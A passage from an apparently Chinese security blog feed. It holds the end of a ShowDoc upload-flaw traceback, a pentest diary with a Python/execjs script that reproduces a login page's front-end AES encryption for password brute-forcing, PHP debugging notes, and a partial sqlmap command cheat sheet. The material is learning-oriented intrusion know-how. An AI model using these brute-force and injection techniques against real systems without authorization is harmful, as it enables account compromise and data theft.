href="http://document.thinkphp.cn/manual_3_2.html#upload">说明文档</a>中则使用的是正确的<code>$upload-&gt;exts</code>写法</li><li>那么为什么ThinkPHP官方是对的，而民间大家用的是这种错误的写法？会不会是官方早期版本教学用的就是这个错误的写法？</li></ol><h2 id="5-3-官方自相矛盾吗"><a href="#5-3-官方自相矛盾吗" class="headerlink" title="5.3 官方自相矛盾吗"></a>5.3 官方自相矛盾吗</h2><ol><li>怀疑是ThinkPHP3.2以下版本的官方文档自身用了错误的写法，而民间只是历史沿用这一用法，搜了<a href="http://www.thinkphp.cn/info/194.html">ThinkPHP3.1的说明文档</a>，果不其然用的就是<code>$upload-&gt;allowExts</code> 的错误方式</li><li>那么TP3.2官方为什么在文档中更正TP3.1中的错误的写法？是因为当时爆出了漏洞吗？遗憾的是检索后发现TP3.1并没有爆出这类漏洞</li><li>继续追踪，查看3.1和3.2官方源码发现：是在TP从3.1到3.2版本升级的时候，由于编写文件上传类的负责人换了<code>liu21st</code>→<code>zuojiazi</code>，使得①类名<code>UploadFile()</code> →<code>Upload()</code>②白名单后缀数组名<code>allowExts</code> → <code>ext</code>③文件名，文件路径等发生变更。</li><li>仔细对比3.1和3.2的文档，发现虽然源码发生改变，但对应的教学文档也发生了相应的改变，本质上并不存在漏洞。</li><li>也就说①3.1版本的源码配合3.1的文档，<code>$upload = new UploadFile()</code>搭配<code>$upload-&gt;allowExts</code>不会产生漏洞；②3.2版本的源码配合3.2的文档，<code>$upload = new \Think\Upload()</code>搭配<code>$upload-&gt;exts</code>也不会发生漏洞。③但是3.2的版本使用3.1的文档，<code>$upload = new \Think\Upload()</code>搭配<code>$upload-&gt;allowExts</code>就会产生漏洞，而showdoc的漏洞成因很大几率来源于此。</li><li>再次百度、Google相关教程网页，发现民间教程也都和官方文档一样，一一对应（刚刚只关注键名的不同没关注类名的不同，误会民间教程了）。</li><li>也就说官方教程不存在问题，网上教程也不存在问题，如showdoc官方案例这种错赋值的写法并未检索到，那么只能是个人了！</li></ol><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2022.png"></p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2023.png"></p><h2 id="5-4-大结局：个人问题"><a href="#5-4-大结局：个人问题" class="headerlink" title="5.4 大结局：个人问题"></a>5.4 大结局：个人问题</h2><ol><li>真的是个人问题吗？</li><li>再往前追：2016年8月showdocV1.0.0版本就存在<a href="https://github.com/star7th/showdoc/blob/v1.0.0/Application/Home/Controller/PageController.class.php">这种错误的写法</a>，但是14年TP3.2就出现了</li><li>由于两个作品发布前后间隔两年，首先怀疑作者是基于一个通用模板或CMS改的，但是检索了半天开源框架并没有发现类似案例。</li><li>其次只能怀疑是面向百度编程的通病：①百度内容②发现官网文档③发现demo，但是运行失败③魔改一番，手动将类名由uploadfile改为upload⑤程序运行成功⑥不影响正常业务⑦大功告成！</li><li>我按照这个步骤复现之后发现很类似，最后和作者取得联系，和怀疑的基本差不多。</li></ol><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2024.png"></p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2025.png"></p><h2 id="5-5-时间线"><a href="#5-5-时间线" class="headerlink" title="5.5 时间线"></a>5.5 时间线</h2><p>2013年06月07日：ThinkPHP3.1.3发布，使用<code>UploadFile()-&gt;allowExts</code></p><p>2014年02月03日：ThinkPHP3.2 发布，使用<code>Upload()-&gt;exts</code></p><p>2016年08月07日：showdocV1.0.0发布 ，使用<code>UploadFile()-&gt;exts</code> </p><p>2019年10月12日：RoarCTF开赛，并于14日Ethan师傅Fuzz出了这个点，但其未深究</p><p>2020年08月12日：plzmyy师傅根据Ethan师傅的WP发现showDoc的漏洞</p><h2 id="5-6-总结"><a href="#5-6-总结" class="headerlink" title="5.6 总结"></a>5.6 总结</h2><p>溯源到最后，可以说showdoc是个特例，是由于开发者的一时疏忽导致的。诚然在这个里面个人开发者占很大的问题，但也希望给厂商企业敲响一个警钟，在版本升级时不仅要注意文档和代码的对应性，也需要在更改类的字段名时候慎重考虑。</p><p>对于Ethan师傅也有点可惜，他觉得是个0day，但未深究跟踪一下代码，也许他就真的发现了一个0day。</p><p>对于CTFer来说，也需要多看WP，也许能收获到不同的东西</p><p>对于面向百度编程的我，也需要警惕不要做一个盲目CV的代码首席移动工程师。</p><h1 id="6-大总结"><a href="#6-大总结" class="headerlink" title="6. 大总结"></a>6. 大总结</h1><p>从一个文件上传1day的复现开始，到用Goby简单的GUI编写POC&amp;EXP，再到不满足需求，于是选择用Go语言编写，并且使用Goby自带API不断优化POC，最终实现一键反弹shell。不仅学习了Go，也对EXP进一步的完善。</p><p>代码审计，从一个为什么产生出发，不断地问自己问题，虽然是一次简单的代审，延伸出一次溯源，最后的收获远不止一次代码审计，不可思议的是我的总结居然升华到了人。</p><p>正如Zwell说的“不断问自己问题”的学习方法，随着不停的问自己问题，记录下问题解决它，好奇心吸引着我，最后抵达了一个新的高度，共勉！</p>]]></content>
    
    
    <categories>
      
      <category>漏洞研究</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>POC编写</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>first vuln from practice to practice</title>
    <link href="/2019/07/18/%5Bold%5D%E7%AC%AC%E4%B8%80%E4%B8%AA%E6%B4%9E/"/>
    <url>/2019/07/18/%5Bold%5D%E7%AC%AC%E4%B8%80%E4%B8%AA%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p>这算是我的第一次渗透测试了，之前是DVWA，不算真实环境的那种！这次因为公司分配原因，我分配漏了（哈哈哈哈），然后就和学长一起做<br>由于学长太强，我就可以自由安排时间想干啥就干啥，我主要想测试登录界面账号密码的爆破，就干了。就全程淌水吧！太快乐了！</p><h1 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h1><ol><li><p> 测试爆破，先burp抓个包！</p></li><li><p>发现拦截到的账号密码中的密码部分采取了加密，查看了下源代码<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190713103853.png" alt="20190713103853.png"></p><blockquote><p>本质上，代码很简单，就是很常见的demo而已！见此文:<a href="https://www.jianshu.com/p/a47477e8126a">代码一</a><a href="https://www.cnblogs.com/lz2017/p/8046816.html">代码二</a></p></blockquote></li><li><p> 代码流程:前端调用了crypto-js库进行加密，而且key都是源代码里面，那么就存在理论上爆破的可能性</p></li></ol><p>一个相似的案例：<a href="https://www.jianshu.com/p/94c407cf75a4">文章</a></p><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>就是因为密码被前端加密了，所以burp直接爆破存在一定难度<br>因此想法就是python爆破,当务之急是模拟这个加密的过程</p><ol><li> 直接调用python有的crypto库及其AES加密格式</li><li>python里面调用js代码<ol><li> PyExecJS、js2py，pyv8</li><li> selenium框架</li></ol></li></ol><h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><ol><li>直接调用python有的crypto库及其AES加密格式<ul><li>  好像API不同，什么iv偏移量之类的都发现，感觉不合适，放弃了 </li></ul></li><li>js2py<ul><li>先说说PyV8、PyExecJS、js2py的区别吧！<br>  js2py是装换代码本身，改为python可执行的，PyV8、PyExecJS是模拟js执行，本质完全不同.而PyExecjs是通过将要运行的js代码写到/tmp下面的随机文件里，然后调用相关的解释器执行该文件，效率相较于pyv8也是慢了点</li><li>  所以考虑到js2py是js转换为python，效率上肯定不如上面的，就放弃了</li></ul></li><li>pyv8<ul><li>   找到了一个案例：<a href="https://www.jianshu.com/p/055e1ddf7bb2%EF%BC%8C%E8%80%8C%E4%B8%94%E4%BB%A3%E7%A0%81%E4%B9%9F%E5%B8%AE%E6%88%91%E5%86%99%E5%A5%BD%E4%BA%86">https://www.jianshu.com/p/055e1ddf7bb2，而且代码也帮我写好了</a></li><li>   太难安装了，而且是2010年的库很久没维护了，就放弃了</li></ul></li><li>selenuim框架<ul><li>   讲道理很好用的框架。原理是：调用浏览器然后模拟用户输入进行尝试。</li><li>   我搞了差不多一天,学长1个小时利用这个selenuim框架就搞定了，我后面自己简单尝试了下，反正上手挺快的</li><li>   缺点很明显就是慢，因为要调用浏览器，然后通过浏览器去执行<h1 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h1>我一开始尝试的就是pyexecjs，只是中途报了半天错，各种调试心态崩就转而尝试过上面的内容，但是最终还是pyexecjs帮我做出来了，当然效率肯定是比selenuim框架高的<br>直接贴代码，源头出自<a href="https://blog.csdn.net/qq523176585/article/details/94010652">这篇文章</a><br>特别感谢那个博主居然能在一个小时之内回复我！！！我都差点放弃了。。。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> execjs<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">js_aes</span>(<span class="hljs-params">text</span>):</span><br>    jscode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    function encode(password)&#123;</span><br><span class="hljs-string">        var CryptoJS = require(&quot;crypto-js&quot;);#这个是个核心</span><br><span class="hljs-string">        var key = CryptoJS.PBKDF2(</span><br><span class="hljs-string">            &#x27;xxxxx&#x27;,#你的key</span><br><span class="hljs-string">            CryptoJS.enc.Hex.parse(&#x27;xxxxxxx&#x27;),#你的key</span><br><span class="hljs-string">            &#123;keySize: 4, iterations: 1000&#125;);</span><br><span class="hljs-string">        var encrypted = CryptoJS.AES.encrypt(</span><br><span class="hljs-string"></span><br><span class="hljs-string">            </span><br><span class="hljs-string">            password,</span><br><span class="hljs-string">            key,</span><br><span class="hljs-string">            &#123;iv: CryptoJS.enc.Hex.parse(&#x27;xxxxxx&#x27;)&#125;);#你的key</span><br><span class="hljs-string">        return encrypted.ciphertext.toString(CryptoJS.enc.Base64);</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    ctx = execjs.<span class="hljs-built_in">compile</span>(jscode)<br>    encrypto = ctx.call(<span class="hljs-string">&quot;encode&quot;</span>,text)<br> <br>    <span class="hljs-keyword">return</span> encrypto<br>    <br>text = <span class="hljs-string">&quot;123456&quot;</span><br>js_res = js_aes(text)<br><br><span class="hljs-built_in">print</span> (js_res)<br></code></pre></td></tr></table></figure><blockquote><ul><li> 我之前做出了加密过程，具体爆破脚本就没写了，就只是python的request库即可</li><li> 由于我此次只需要js加密过程，不需要AES加密就删除了大多部分</li><li> 中间的js_ase函数中间的encode部分，根据此处的环境，我做了更改</li><li> 博主那篇文章对我而言最核心的部分在于<code>var CryptoJS = require(&quot;crypto-js&quot;);</code>帮我解决了困扰了一天的问题，即如何在js函数里面又去执行js库文件，我之前各种尝试出错，出错过程见下文</li></ul></blockquote></li></ul></li></ol><p>然后跑出来的加密结果和burp拦截到前端加密的结果一样 都是zw8vndc9TsKa7HK+8jHd6g==，于是故事就差不多了，就剩下吧这个js_res和request结合在一起写爆破脚本了</p><h1 id="防护之道"><a href="#防护之道" class="headerlink" title="防护之道"></a>防护之道</h1><ol><li> 验证码！但是之前尝试过验证码识别的爆破。。。感觉实际防护效果一般，只要攻击方投入足够的精力即可爆破</li><li> 采取其他加密方式，而且不是采取对称的AES加密，更何况key都在本地了！</li><li> 限制登录次数！这个才是完美无敌解！<h1 id="遇到的坑"><a href="#遇到的坑" class="headerlink" title="遇到的坑"></a>遇到的坑</h1><h2 id="crypto和前端Js代码如何一起整合进python库"><a href="#crypto和前端Js代码如何一起整合进python库" class="headerlink" title="crypto和前端Js代码如何一起整合进python库"></a>crypto和前端Js代码如何一起整合进python库</h2>因为这个前端的js代码调用crypto的js库进行加密，涉及到两个含js文件<br>按照pyexecjs的<a href="https://pypi.org/project/PyExecJS/">官方网站</a>，或者百度上pyexecjs的demo都只涉及到一个js文件整合到python文件里面，这里是两个。<blockquote><p>我尝试过把前端加密函数的js函数放在crypto库密码合并为一个文件，无论把js文件放在开头还是结尾，还是中间各种报错。<br>我也尝试过<code>execjs.compile(jscode+jsstr) </code>这种格式同时编译两个文件在一起，但是还是不行</p><blockquote><p>后来发现crypto库里面是俩个(function(){…})()函数,这种格式是个立即执行函数，可能存在这方面因素<br>前端Js加密需要的是个crypto的对象，而(function){}()就是返回这个对象，直接插进去肯定有问题啊。怎么返回这个对象？你这个插入的前端加密的js函数怎么去调用它？怎么返回这个加密后的值？</p></blockquote></blockquote><h2 id="js里面尝试包含js文件"><a href="#js里面尝试包含js文件" class="headerlink" title="js里面尝试包含js文件"></a>js里面尝试包含js文件</h2>尝试文件包含，但是百度搜的是js文件包含，js文件里面包含另外一个文件之类的关键词，得到的<br><code>document.write(&quot;&lt;script language=javascript src=&#39;xxx.js&#39;&gt;&lt;/script&gt;&quot;);</code>还有各种姿势，反正都有问题<blockquote><p><del>看了上面的代码，发现一个require，然后返回对象就能解决</del><br>我所尝试文件包含的想法是：从html里面js文件copy到本地创建的crypto.js文件，然后包含，类似于html里面的加密实现，但是怎么在python里面执行js代码，然后这个js代码再去调用js库文件？这一套执行流程百度不到，算是开天辟地，所以我就。。。反正瞎尝试，也就浪费了一上午<br>而poc里面是npm下载的整个crypto库进行的require然后返回对象。</p></blockquote><h2 id="pyv8安装"><a href="#pyv8安装" class="headerlink" title="pyv8安装"></a>pyv8安装</h2>当时下载的pyv8文件夹里面看到pyd和macosx文件，没有找到.so的文件，感觉不对就放弃了<br>但是发现只是自己没多找几篇pyv8的文章：下载的文件里面没有.so文件但是要自己改名来着。。。。<h2 id="poc执行报错说：Cannot-find-module-‘crypto-js’"><a href="#poc执行报错说：Cannot-find-module-‘crypto-js’" class="headerlink" title="poc执行报错说：Cannot find module ‘crypto-js’"></a>poc执行报错说：Cannot find module ‘crypto-js’</h2>npm安装这个crypto库,需要在poc脚本的同目录下执行nmp install crypto这个命令才可以，然后生成node_modules下面的crypto-js文件夹即可（安装这个库的命令记不清了，可能有误，推荐百度）</li></ol><h1 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h1><ol><li> 感觉自己好像就是拿了爬虫的方法搞了信息安全，信息安全好像啥都学?但是好像啥都可以在渗透过程中使用?</li><li> 要多学几种方法,因为可能这个pyexecjs会报错，pyv8就不会。这里爆破数目不大，且操作复杂，使用selenuim框架即可。多掌握方法，实际灵活改变即可</li><li> 忙了一天，这么简单的问题。。。但是学长也说这些坑他都踩过，还行吧，多踩下没坏处！</li><li> 不要放弃！坚持就是胜利，我差点就放弃了pyexecjs这条方法了都，但是皇天不负有心人！</li></ol><h1 id="其他文章推荐"><a href="#其他文章推荐" class="headerlink" title="其他文章推荐"></a>其他文章推荐</h1><p>今天发现了很多相似的文章，他们写的更好，推荐下</p><p>Bypass师傅的：<a href="https://blog.csdn.net/qq_23936389/article/details/81256012">https://blog.csdn.net/qq_23936389/article/details/81256012</a></p><p>多种姿势：<a href="https://www.freebuf.com/articles/web/127888.html">https://www.freebuf.com/articles/web/127888.html</a></p><p>工具：<a href="https://github.com/c0ny1/jsEncrypter">https://github.com/c0ny1/jsEncrypter</a></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>值得纪念</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vscode调试php底层代码</title>
    <link href="/2019/07/09/%5Bold%5Dphp%E5%BA%95%E5%B1%82%E6%BA%90%E4%BB%A3%E7%A0%81/"/>
    <url>/2019/07/09/%5Bold%5Dphp%E5%BA%95%E5%B1%82%E6%BA%90%E4%BB%A3%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h1 id="window"><a href="#window" class="headerlink" title="window"></a>window</h1><h2 id="静态编译"><a href="#静态编译" class="headerlink" title="静态编译"></a>静态编译</h2><p>window下参考Rai4over的文章</p><ol><li>文章一：<a href="https://www.secpulse.com/archives/73801.html">原文但是图片被吞</a><br> 文章二：<a href="https://cloud.tencent.com/developer/news/286157">含图片但是格式有问题</a><br> 二者都是相同的文章，只是图片和格式互补</li><li>对照上面的步骤<ol><li> 下载VS</li><li><a href="https://github.com/microsoft/php-sdk-binary-tools">php-sdk</a> 和 <a href="https://github.com/php/php-src">php-src</a>尝试GitHub下载<br>无奈git clone速度太慢，就直接下zip。速度下载的快一点，但是无法git check来切换php的不同版本分支</li><li> 按照上面的文章 来打包文件，配置文件即可</li><li> vscode按照c/c++拓展+配置lauch文件，同时打开<code>xxxx\phpdev\vs16\x64\php-src\ext\standard\image.c</code>文件设置断点，我这边的在1525<del>1533</del>行，R师傅的在1503行因此对照函数搜即可</li></ol></li></ol><p>运行F5调试会报错</p><ul><li>  调试控制台输出<code>Loaded &#39;C:\Windows\System32\xxxxx.dll&#39;. Cannot find or open the PDB file.</code></li><li>  问题输出<code>&quot;message&quot;: &quot;#include errors detected. Please update your includePath. Squiggles are disabled for this translation unit </code></li><li>  问题输出<code>cannot open source file &quot;xxx.h&quot;</code><br>这些都是正常现象，报错依然可以执行断点，依然可以查看底层代码</li></ul><p><strong>前提你断点 设置的没问题</strong></p><h2 id="动态编译"><a href="#动态编译" class="headerlink" title="动态编译"></a>动态编译</h2><p>上述是静态编译，也就是说无需启动网页，直接编译查看底层源代码<br>下面这个是动态编译步骤，即启动网页才会触发断点，适合传递参数的地方<br><a href="https://www.jianshu.com/p/29bc0443b586">https://www.jianshu.com/p/29bc0443b586</a></p><hr><h1 id="其他系统搭建环境"><a href="#其他系统搭建环境" class="headerlink" title="其他系统搭建环境"></a>其他系统搭建环境</h1><p>找到的其他参考：<br>mac下 除了P牛的知识星球文章，另外一个<a href="https://www.phpzjj.com/article/6054.html">https://www.phpzjj.com/article/6054.html</a><br>win下利用VS断点调试，而非VSCODE <a href="https://xz.aliyun.com/t/2004">https://xz.aliyun.com/t/2004</a> </p><hr><h1 id="教训"><a href="#教训" class="headerlink" title="教训"></a>教训</h1><p>教训断点位置设置错误</p><p>运行1.php文件，报错</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">#include errors detected. Please update your includePath. Squiggles are disabled for this translation unit (C:<span class="hljs-symbol">\p</span>hp<span class="hljs-symbol">\p</span>hp-sdk-binary-tools-master<span class="hljs-symbol">\p</span>hp-sdk-binary-tools-master<span class="hljs-symbol">\p</span>hpdev<span class="hljs-symbol">\v</span>s16<span class="hljs-symbol">\x</span>64<span class="hljs-symbol">\p</span>hp-src-master<span class="hljs-symbol">\e</span>xt<span class="hljs-symbol">\s</span>tandard<span class="hljs-symbol">\i</span>mage.c).<br></code></pre></td></tr></table></figure><p><del>核心问题在于C语言编译环境我没有配置，于是转mingw去了</del><br>你装了VS，还装什么mingw？有病吧！C++自带好么？（当时真的头昏搞这个东西）</p><p>后面用VS调试，设置断点的时候发现1525和1533都是一样的函数，只是传递过来的参数不同而已，也就是说断点设置错误的了位置</p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vscode</tag>
      
      <tag>学习笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqlmap命令备忘录</title>
    <link href="/2019/07/08/%5Bold%5Dsqlmap%E5%91%BD%E4%BB%A4%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    <url>/2019/07/08/%5Bold%5Dsqlmap%E5%91%BD%E4%BB%A4%E5%A4%87%E5%BF%98%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="建议"><a href="#建议" class="headerlink" title="建议"></a>建议</h1><p><del>建议大家自己过一次命令，不要仅仅停留在看。<br>网上总结命令的文章一大堆，很全但是很杂包括我这篇文章，看着看着可能就看不下去了，不如一个个的自己过。<br>我个人是看着苑老师的视频过了一次感觉比自己一个个尝试要有趣不少。所以如果有视频的话，大家也可以看着视频过。<br>所以看到这，建议你直接跳到文末看我给你的资料，或者crtl+w马上动手干</del></p><p>时光荏苒，三年过去基本都忘了</p><hr><h1 id="sqlmap用途"><a href="#sqlmap用途" class="headerlink" title="sqlmap用途"></a>sqlmap用途</h1><ul><li>提供五种漏洞检测技术<ol><li>  基于布尔的盲注检测</li><li>  基于时间的盲注检测</li><li>  基于错误的检测</li><li>基于union联合查询的检测<ul><li>  适用于通过循环输出联合查询结果，否则只显示第一项结果</li></ul></li><li>基于堆叠查询的检测<ul><li>  堆叠多个查询语句</li><li>  适用于非select的数据修改，删除操作  </li></ul></li></ol></li><li>其他特性<ol><li>数据库直接连接 -d<ul><li>   前提是拥有对应数据库的账号密码，身份认证信息</li><li>   优点是不需要下载对应的数据库客户端程序，直接使用sqlmap作为客户端去连接对应的数据库的端口</li></ul></li><li>与burpsuite，google联动<ul><li>   结合正则表达式限定搜索目标，然后sqlmap调用GOOGle搜索引擎去搜索，搜索得到的url结果在通过sqlmap测试  </li></ul></li><li>get，post,cookie,referer,可以随机或者指定<ul><li>  cookie过期后自动处理set-cookie头，更新cookie信息。也就你不用担心扫着扫着cookie过期的问题，非常只能</li><li>  user-agent默认是：</li></ul></li><li> 限速：最大并发，延迟发送，使之隐蔽性更强</li><li> 支持basic,digest,html,ca身份认证</li><li> 数据库版本，用户，权限，hash枚举和字典爆破，暴力破解表列名称</li><li> 文件上传、upf，启动并执行存储过程，操作系统命令执行，访问windows注册表（进行增删改查）</li><li> 与w3af，metasploit集成使用，基于数据库服务进程提权和上传执行后门</li></ol></li></ul><h1 id="sqlmap命令"><a href="#sqlmap命令" class="headerlink" title="sqlmap命令"></a>sqlmap命令</h1><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><ol><li> -h/hh 后者显示的信息更多</li></ol><h2 id="target"><a href="#target" class="headerlink" title="target"></a>target</h2><ul><li>-u<ul><li>  建议用双引号括起来url地址 ，如果url里面含有双引号 记得\去转义</li><li>  用-p xxx指定特定的参数进行注入，而不是所有参数都查询</li><li>  -f fingerprint 查询指纹信息 比如版本 等信息</li><li>  –users 查询当前数据库的所有管理账号</li><li>  –banner 提示版本信息</li><li>  –dbs 查询数据库管理系统里面有哪些库</li><li>  –schema 查元数据库，会以表格的形式呈现出来，当然需要有查询information_schema库的权限。但是如你所知这个库很大，查询需要半天</li><li>  -a 即all： 上面–xxx都查</li></ul></li><li>-d “mysql://账号:密码@ip：port/数据库名称” -参数 <ul><li>  -f -users -a  因为是直接连接去查询，而不是基于漏洞发现 所以速度很快</li></ul></li><li>-m xx.txt 指定一个含有多个url地址的文件进行扫描<ul><li>  -f -users -a 后面跟上去查询</li></ul></li><li>-g  “inurl:&quot;php?id=1&#39;” 接合google扫描结果<ul><li>  由于要翻墙 要设置代理所以待定</li></ul></li></ul><p>如果是post方法，这个时候就无法传递url去-u传递参数</p><ol><li>使用http请求文件（burpsuite）<ol><li> burp拦截请求，将请求命令复制粘贴到一个post.txt文件（用vi复制粘贴的时候，会出现自动换行 会导致格式出错，gedit编辑文件最好）</li><li> -r post.txt读取对应的文件 在-f –dbs等去查询对应的信息 </li></ol></li><li>使用burpsuite的log文件 <ol><li> 开启log记录：option==&gt;logging=====&gt;选择proxy请求进行保存—&gt;选择保存的文件位置</li><li> 浏览器访问，这个时候请求会自动生成log文件</li><li> sqlmap -l log.txt  </li><li> 可以跟上-p -f等参数</li></ol></li><li> 后面要讲的–data</li></ol><p>https 支持该类请求 –force-ssl指定使用https与目标服务器进行通信<br>如果不是默认的443端口 可以在url后面跟上对应的端口号 xxx?id=1:8843进行请求，防止一定的错误</p><p>可以自定义扫描的配置参数文件，无非就是各种参数-a -d -p的集合，使得你下次再使用sqlmap的时候不用在输入那么长的命令，直接-c sqlmap.conf 来自定义扫描配置文件<br>官方有sqlmap.conf的默认配置文件 可以自己找一找 </p><h2 id="request"><a href="#request" class="headerlink" title="request"></a>request</h2><ul><li>数据段： –data<ul><li>  get/post通用</li><li>-u “xxx” –data=“uanme=xxx&amp;pass=xxx”  -f<ul><li>  此时就不需要和上面一样在url里面指定参数，而单独拿出来，此时就可以不仅get还有post都支持</li></ul></li><li>  不需要前面有个?来间隔参数和url</li><li>  默认以&amp;作为分隔符来逐个识别和注入对应的参数，可以–param-del=’;’来制定特定的参数作为分隔符，此时–data=“uanme=xxx;pass=xxx” 来表示</li></ul></li><li>cookie段： –cookie =”xxxx”<ul><li>  web应用需要基于cookie的身份认证</li><li>  检查cookie中的注入点（使用默认的level-1的时候不会检查，当level ≥2时候才自动后台测试  –level 2）</li><li>  如果服务器端set-cookie使得cookie有更新，sql会自动更新，但是如果你不想使用新的cookie可以–drop-set-cookie，使得继续使用之前的cookie</li></ul></li><li>http头<ul><li>user-agent<ul><li>  默认是sqlmap/1.x-dev-xxxxx(<a href="http://sqlmap.org)的格式,因为默认是sqlmap/xxxx%EF%BC%8C%E6%89%80%E4%BB%A5%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E5%8F%AF%E4%BB%A5%E9%87%87%E5%8F%96%E4%B8%80%E5%AE%9A%E7%9A%84%E8%BF%87%E6%BB%A4%E6%89%8B%E6%AE%B5%EF%BC%81">http://sqlmap.org)的格式，因为默认是sqlmap/xxxx，所以服务器端可以采取一定的过滤手段！</a></li><li>  可以–user-agent=”xxx”来指定对应的agent</li><li>  加上参数–random-agent时候他才会向/usr/share/sqlmap/user-agents.txt文件里面随机选取agent（包含 chrome ie  safari  opera firfoxg各个版本的agent）。</li><li>  level≥3才会自动检查agent里面的注入点</li><li>  当手动注入成功，但是sqlmap不成功的话，可能怀疑就是user-agent这里存在一定的过滤</li></ul></li><li>host<ul><li>  –host=“xx”指定对应的主机名</li><li>  level≥5（最高扫描级别）</li></ul></li><li>referer<ul><li>  –referrer=”xxx”指定</li><li>  level≥3</li></ul></li><li>额外的headder: –headers=“xxxx”<ul><li>  万一那天那个怪人指定了一个额外的header头呢？</li><li>  每个头单独写一行（名称区分大小写）<code>--headers=&quot;Host:www.www.com\nUser-Agent=chrome&quot;</code>，即\n换行。但是一定要注意区分大小写！！！！！</li></ul></li></ul></li><li>  上述的都没有指定请求方法，默认先尝试get再post，你也可以指定–method=POST 或者get</li><li>基于HTTP协议的身份验证<ul><li>  Basic</li><li>  Digest（摘要）</li><li>  NTLM</li><li>  方法：–auth-type Basic –auth-cred “USER:PASS”,这样可以过掉需要身份认证的网页，比如DD的那道题要填写账号密码才能访问</li></ul></li><li>–auth-cert /–auth-file<ul><li>  基于客户端进行客户端证书认证（少见，大多出现在网银情况下）</li><li>  –auth-file=”ca.PEM”</li><li>  只支持PEM格式证书（含有或不含有私钥都行）</li></ul></li><li>http(s)代理<ul><li>  –proxy=”<a href="http://127.0.0.1:8087&quot;，如果代理需要身份认证：--proxy-cred=&quot;name:pass&quot;">http://127.0.0.1:8087&quot;，如果代理需要身份认证：--proxy-cred=&quot;name:pass&quot;</a></li><li>  –ignore-proxy：忽略系统级代理设置，通常用于扫描本地网络目标。因为有的基于操作系统层面实现的代理，而非基于浏览器层面实现的代理。这样流量就直接发到外网去了而导致内网的无法访问</li></ul></li><li>请求延迟，超时，尝试重连次数<ul><li>  建议格式 –xxxx=”xxx”  这种格式优于–xxx x，第一方便参数多的时候识别，第二不易出错</li><li>  –delay：请求的延迟时间，浮点数，时间为秒，默认无延迟 </li><li>  –timeout：请求超时时间，浮点数，默认30秒</li><li>  –retries：http连接超时重试次数，默认3次</li><li>  –randomize：长度、类型与原始值保持一致的请求下，指定每次请求随机取值的参数值</li></ul></li><li>–scope,对于前面的-l指定的log文件比较好，可以通过正则表达式筛选扫描对象过滤日志内容<ul><li>  –scope=”(www)?\ .target\ .(com|net|org)”</li><li>  –scope=”(19)?\ .168\ .20(1|10|100)”</li></ul></li><li>–safe-url/–safe-freq<ul><li>  检测和盲注阶段会产生大量请求，服务器端可能会因此销毁session。</li><li>  每经过–safre-freq次注入请求之后，发送一次正常请求，来防止错误次数过多导致的注入无法正常进行</li></ul></li><li>  